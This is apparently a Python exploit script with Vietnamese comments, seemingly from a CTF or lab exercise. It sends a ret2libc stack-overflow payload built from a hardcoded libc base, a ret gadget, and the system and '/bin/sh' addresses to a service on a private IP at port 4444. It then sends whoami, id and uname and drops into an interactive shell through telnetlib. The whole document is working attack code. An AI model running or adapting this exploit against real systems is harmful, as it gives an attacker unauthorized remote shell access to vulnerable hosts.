import socket
import struct
import time
import telnetlib

target_ip = "192.168.91.129"
target_port = 4444

offset = 76
libc_base = 0xf7dca000

system_addr = libc_base + 0x41360
binsh_addr  = libc_base + 0x18c363

# Ret gadget từ objdump của bạn (c3 ret thuần)
ret_offset = 0x165f74  # thử cái này trước, nếu fail thử 0x165f84 hoặc 0x166019
ret_gadget = libc_base + ret_offset

payload = (
    b"A" * offset +
    struct.pack("<I", ret_gadget) +      # ret để align stack (fix SSE crash trong system)
    struct.pack("<I", system_addr) +
    struct.pack("<I", 0xdeadbeef) +      # fake ret (an toàn)
    struct.pack("<I", binsh_addr)
)

print("[+] Payload info (sử dụng ret gadget thật từ libc):")
print(f"  libc_base   : {hex(libc_base)}")
print(f"  system      : {hex(system_addr)}")
print(f"  /bin/sh     : {hex(binsh_addr)}")
print(f"  ret gadget  : {hex(ret_gadget)} (offset 0x{ret_offset:x})")
print(f"  Payload len : {len(payload)}")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6.0)
    s.connect((target_ip, target_port))
    s.send(payload)

    print("[*] Payload đã gửi. Chờ 4s để /bin/sh khởi động...")
    time.sleep(4.5)

    # Gửi lệnh test mạnh
    s.send(b"whoami; id; echo 'HUNG PWND THE SYSTEM!'; uname -a; pwd; ls -la\n")
    time.sleep(2.0)

    try:
        resp = s.recv(8192)
        if resp:
            print("\n[+] Response từ shell (nếu có):\n" + resp.decode(errors='ignore').rstrip())
            if b"uid=" in resp or b"HUNG PWND" in resp:
                print("[!!!] THÀNH CÔNG! Shell đã sống → interact...")
                t = telnetlib.Telnet()
                t.sock = s
                t.interact()
                # Nếu thành công, bạn có shell root/user → lấy flag nếu là CTF
    except Exception as e:
        print(f"Recv lỗi: {e} → shell có thể sống nhưng không response ngay. Thử interact thủ công.")

    print("\n[*] Interact shell (gõ lệnh như id, cat /flag, ls /home)...")
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

except Exception as e:
    print(f"Lỗi kết nối/gửi: {e}")
    print("→ Chạy dmesg | tail trên victim và paste lại để xem crash IP mới.")
